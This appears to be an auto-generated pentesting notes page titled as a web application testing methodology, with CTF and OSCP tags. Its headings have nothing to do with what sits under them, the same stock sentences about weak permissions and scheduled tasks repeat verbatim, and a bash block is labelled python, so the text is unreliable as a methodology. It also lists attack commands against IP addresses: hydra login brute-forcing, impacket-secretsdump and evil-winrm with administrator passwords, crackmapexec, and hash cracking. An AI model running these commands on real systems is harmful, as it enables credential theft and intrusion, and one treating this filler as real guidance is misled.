---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "oscp, lateral movement, malware"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-360.html"
URL_IMAGES: ""
Date: "2026-02-03"
Tags: "OSCP, Lateral Movement, Malware"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-360"
Permalink: "/notes/note-web-application-penetration-testing-meth-360.html"
BtnLabel: "Read Notes"
Pick: 0
---
## netcat

### metasploit

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.239.109 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Elasticsearch

### burpsuite

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.186.149 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.109.215.28/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.151.39 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `NTLM Relay`
- `Writable PATH`
- `sharphound`

## msfvenom

### SeImpersonatePrivilege

- `sharphound`
- `CSRF`
- `Insecure Deserialization`
- `Weak Service Permissions`
- `bloodhound`
- `Remote File Inclusion`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.114.114.24
gobuster dir -u http://10.77.192.134/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.28.46.108 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.65.66.198 -u administrator -p 'P@ssw0rd!' --shares
```

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

## SUID Binary

### FTP

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

- `Sudo Misconfiguration`
- `Command Injection`
- `gobuster`
- `socat`
- `Path Traversal`

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.246.88/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.56.96 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `msfvenom`
- `burpsuite`
- `Weak Service Permissions`
- `impacket`
- `metasploit`

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.
